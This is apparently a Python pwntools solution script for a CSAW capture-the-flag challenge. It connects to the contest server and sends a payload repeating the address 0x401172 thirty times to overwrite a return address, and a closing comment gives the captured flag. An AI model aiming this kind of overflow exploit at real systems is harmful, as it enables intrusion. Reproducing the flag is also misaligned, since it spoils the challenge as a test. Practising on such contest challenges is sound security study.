from pwn import *

r = remote('pwn.chal.csaw.io', 5000)
# EXPLOIT CODE GOES HERE 0x401172
r.sendline(b'\x72\x11\x40\x00\x00\x00\x00\x00'*30)
r.interactive()
#flag{ch4r1i3_4ppr3ci4t35_y0u_f0r_y0ur_h31p}
